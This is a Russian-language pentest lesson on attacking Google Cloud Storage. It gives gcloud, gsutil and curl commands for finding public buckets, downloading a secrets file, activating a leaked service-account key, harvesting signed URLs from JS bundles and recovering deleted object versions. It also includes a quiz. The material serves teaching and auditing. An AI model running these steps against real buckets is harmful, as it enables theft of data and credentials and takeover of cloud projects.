---
id: cloud-gcp-storage
title: "Cloud Storage (GCS): IAM, ACL, публичные бакеты и signed URLs"
category: cloud
parent: cloud-gcp-data-deep
difficulty: medium
order: 1
tags: [cloud, gcp, gcs, storage, buckets, iam, acl, signed-url]
prerequisites: [cloud-gcp-data-deep, cloud-storage-s3]
useful_for:
  - "Пентест Google Cloud Storage"
  - "Поиск публичных бакетов"
  - "Использование утёкших signed URLs"
estimated_minutes: 45
summary: "GCS: IAM vs ACL, uniform bucket-level access, публичные бакеты, signed URLs и object versioning. Как находить и читать данные, которые «должны быть приватными»."
---

## Задача

**Cloud Storage (GCS)** — объектное хранилище Google Cloud. Это крупнейший источник облачных утечек: бакеты делают публичными «на минуту» для теста и забывают, ACL оставляют открытыми, а **signed URL** живут месяцами. Цель урока: найти бакет, который «должен быть приватным», и прочитать из него данные — вплоть до ключей сервисного аккаунта.

## Данные, с которыми работаем

Разберём модель:
- **Bucket** — контейнер с глобально уникальным именем (имя видно всем);
- **Object** — файл внутри; у него есть **поколения (generations)** — версии;
- **IAM** — роли на бакет/объект (`roles/storage.objectViewer`), наследуются от проекта;
- **ACL** — старые per-object гранты; при **uniform bucket-level access (UBLA)** они отключены;
- **Signed URL** — подписанная ссылка, дающая доступ без аутентификации.

Стартуем с инвентаризации бакетов проекта:

```bash
$ gcloud storage buckets list --project acme-prod
NAME                     LOCATION
company-ci-artifacts     US
company-backups          US
```

Имя `company-ci-artifacts` намекает на артефакты сборки — а там часто лежат секреты. Проверяем IAM:

```bash
$ gcloud storage buckets get-iam-policy gs://company-ci-artifacts
bindings:
- members:
  - allUsers
  role: roles/storage.objectViewer
```

Член **`allUsers`** означает: бакет доступен **всем, включая анонимов**. Это публичный бакет.

## Шаг 1: читаем содержимое без аутентификации

Даже не имея аккаунта, мы можем просто скачать объект по HTTP. Но сначала посмотрим, что там есть:

```bash
$ gcloud storage ls -r gs://company-ci-artifacts/**
gs://company-ci-artifacts/builds/app-v1.2.3.tar.gz
gs://company-ci-artifacts/secrets/prod.env
gs://company-ci-artifacts/kube/config
```

Каталог `secrets/` — то, ради чего всё затевалось. Скачиваем:

```bash
$ curl -s "https://storage.googleapis.com/company-ci-artifacts/secrets/prod.env" -o /tmp/prod.env
$ cat /tmp/prod.env
DB_PASSWORD=Sup3rPr0d!
GCP_SA_KEY={"type":"service_account","private_key":"-----BEGIN PRIVATE KEY-----..."}
```

В бакете лежит **ключ сервисного аккаунта GCP** — JSON с приватным ключом. Это полноценная облачная идентичность: активировав её, мы получаем доступ к проекту от имени сервисного аккаунта. Даже если бакет потом закроют, ключ продолжит работать до ротации.

## Шаг 2: используем найденный ключ

```bash
$ gcloud auth activate-service-account --key-file=/tmp/sa_key.json
Activated service account credentials for: [ci-bot@acme-prod.iam.gserviceaccount.com]
$ gcloud projects list
PROJECT_ID      NAME
acme-prod       Acme Production
acme-data       Acme Data
```

Из публичного бакета — в проект.

## Полный прогон от начала до конца

1. `buckets list` → нашли `company-ci-artifacts`.
2. `get-iam-policy` → `allUsers` → бакет публичный.
3. `ls -r` → обнаружили `secrets/prod.env`.
4. Скачали через HTTP без аутентификации → получили SA-ключ.
5. Активировали ключ → доступ к проекту.

## Если публичного бакета нет: signed URL и версии

**Signed URL** — подписанная ссылка, которая работает без учётных данных. Частая утечка: разработчик генерирует ссылку для скачивания и она попадает в JS-бандл, мобильное приложение или лог прокси. Ищем в бандле:

```bash
$ curl -s https://app.example.com/main.js | \
    grep -oE 'https://storage.googleapis.com/[^"]*X-Goog-Signature[^"]*' | head -1
https://storage.googleapis.com/company-exports/report.csv?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Expires=604800&X-Goog-Signature=...
$ curl -s "https://storage.googleapis.com/company-exports/report.csv?X-Goog-Algorithm=..." -o report.csv
$ head -2 report.csv
id,email,plan,revenue
1,user@example.com,pro,1200
```

`X-Goog-Expires=604800` — это 7 дней; ссылка действует до истечения срока. Если она выдана на **запись** (`PUT`), можно загрузить свой объект — потенциальная подмена данных.

**Object versioning** хранит старые поколения. Даже если секрет «удалили», старая версия может быть доступна:

```bash
$ gsutil ls -a gs://company-backups/db-creds.txt
gs://company-backups/db-creds.txt#1699999999999999
gs://company-backups/db-creds.txt#1700000000000000
$ gsutil cp 'gs://company-backups/db-creds.txt#1699999999999999' /tmp/old.txt
```

`#1699999999999999` — номер поколения. Плюс **soft-delete** хранит удалённые объекты 7 дней, и их можно восстановить.

## Если не сработало: обходы и edge cases

- **UBLA.** При uniform bucket-level access ACL отключены — смотри только IAM. При fine-grained ACL могут открывать объект **в обход** IAM.
- **Public access prevention.** Org policy `storage.publicAccessPrevention` блокирует `allUsers`. Проверь, включена ли она: если нет, бакет можно сделать публичным.
- **VPC Service Controls.** Может блокировать доступ к GCS извне периметра — тогда нужен пивот внутри VPC.
- **CMEK.** Шифрование собственным ключом KMS: для чтения нужен `cloudkms.cryptoKeyVersions.useToDecrypt`.
- **Наследование прав.** `roles/storage.admin` на уровне **проекта** даёт доступ ко всем бакетам — проверяй права проекта, а не только бакета.

## Частые ошибки и подводные камни

- **Считать бакет приватным без проверки.** Смотрите и IAM, и ACL — при fine-grained доступе ACL может открывать объект в обход IAM.
- **Игнорировать versioning.** Старые поколения часто содержат то, что «уже удалили».
- **Забывать про soft-delete.** Удалённые объекты хранятся 7 дней и могут быть восстановлены.
- **Не проверять signed URLs.** Они не требуют аутентификации и живут до истечения срока (до 7 дней).
- **Путать права проекта и бакета.** `roles/storage.admin` на уровне проекта даёт доступ ко всем бакетам.
- **Не смотреть UBLA.** При uniform bucket-level access ACL отключены — тогда единственный барьер это IAM.

- **Игнорировать public access prevention.** Если org policy её не включает, бакет можно сделать публичным в любой момент.
- **Не проверять CMEK.** Данные под собственным ключом KMS требуют `useToDecrypt`; без него чтение упадёт.

- **Забывать про VPC Service Controls.** Периметр может блокировать доступ извне — тогда нужен пивот внутри VPC.
- **Не проверять наследование прав.** Право на проект может открывать бакеты, которые вы не видели при инвентаризации.

## Что мы теперь знаем

- `allUsers` в IAM бакета = публичный бакет, доступ без аутентификации.
- В бакетах часто лежат `.env` и SA-ключи — из публичного бакета можно попасть в проект.
- Signed URL работает без учётных данных до истечения срока (до 7 дней).
- Versioning и soft-delete хранят «удалённые» объекты.
- UBLA отключает ACL; public access prevention блокирует публичность.
- Права проекта (`roles/storage.admin`) дают всё; проверяй наследование.

## На что смотреть дальше

- **gcp-firebase**: открытые базы и правила доступа Firebase.
- **gcp-bigquery**: публичные датасеты и экспорт данных.
- **gcp-gke**: захват метаданных пода и node SA.

## Квиз

Проверь себя.

```quiz
- question: "Что означает член allUsers в IAM бакета?"
  options:
    - "Бакет публичен для всех, включая анонимов"
    - "Бакет доступен только сотрудникам"
    - "Бакет зашифрован"
    - "Бакет удалён"
  answer: 0
  explanation: "allUsers — любой пользователь, в том числе без аутентификации."
- question: "Что даёт uniform bucket-level access?"
  options:
    - "Отключает ACL, оставляя только IAM"
    - "Включает шифрование"
    - "Ускоряет загрузку"
    - "Меняет регион"
  answer: 0
  explanation: "UBLA убирает fine-grained ACL, всё решает IAM."
- question: "Почему versioning опасен для владельца данных?"
  options:
    - "Старые версии объектов могут содержать уже «удалённые» секреты"
    - "Он замедляет чтение"
    - "Он публикует бакет автоматически"
    - "Он удаляет IAM"
  answer: 0
  explanation: "Versioning хранит прошлые поколения, доступные при наличии прав."
- question: "Как получить доступ по утёкшему signed URL?"
  options:
    - "Обратиться по ссылке без аутентификации до истечения срока"
    - "Ввести пароль"
    - "Иметь SA-ключ"
    - "Запросить IAM-роль"
  answer: 0
  explanation: "Signed URL содержит подпись и действует без учётных данных."
- question: "Почему бакет с именем company-ci-artifacts особенно интересен?"
  options:
    - "В артефактах сборки часто лежат .env и ключи сервисных аккаунтов"
    - "Он всегда зашифрован"
    - "Он недоступен анонимам"
    - "Он хранит только логи"
  answer: 0
  explanation: "CI-артефакты регулярно содержат секреты, которые забыли убрать."
```

## Куда дальше

В следующем уроке мы разберём **Firebase** — открытые базы данных и слабые security rules, которые часто становятся входом в GCP-проект. А пока главное запомни: **в GCS главный приз — не файлы, а ключи**, и один публичный бакет с `.env` может открыть весь проект.

## Где пригодится

- **Пентест GCP:** аудит бакетов и поиск публичных данных.
- **Bug bounty:** облачные программы с GCS в scope.
- **Red team:** получение SA-ключей из бакетов.
- **Cloud security review:** настройка UBLA и prevention.
